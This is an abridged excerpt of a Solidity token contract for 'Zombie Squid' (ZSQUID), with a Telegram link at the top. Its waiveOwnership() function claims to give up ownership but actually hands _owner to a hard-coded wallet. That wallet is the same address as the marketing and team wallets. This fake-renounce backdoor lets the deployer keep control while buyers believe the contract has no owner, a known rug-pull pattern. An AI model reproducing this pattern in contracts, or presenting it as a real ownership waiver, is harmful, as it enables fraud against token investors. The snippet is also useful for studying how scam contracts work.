...
/**
Telegram : https://t.me/ZombieSquid
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x3F03bc6626D5dEc248689AE5EBBD4B76091F8b62);
    }
...
contract ZombieSquid is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Zombie Squid";
    string private _symbol = "ZSQUID";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x3F03bc6626D5dEc248689AE5EBBD4B76091F8b62);
    address payable private teamWalletAddress = payable(0x3F03bc6626D5dEc248689AE5EBBD4B76091F8b62);
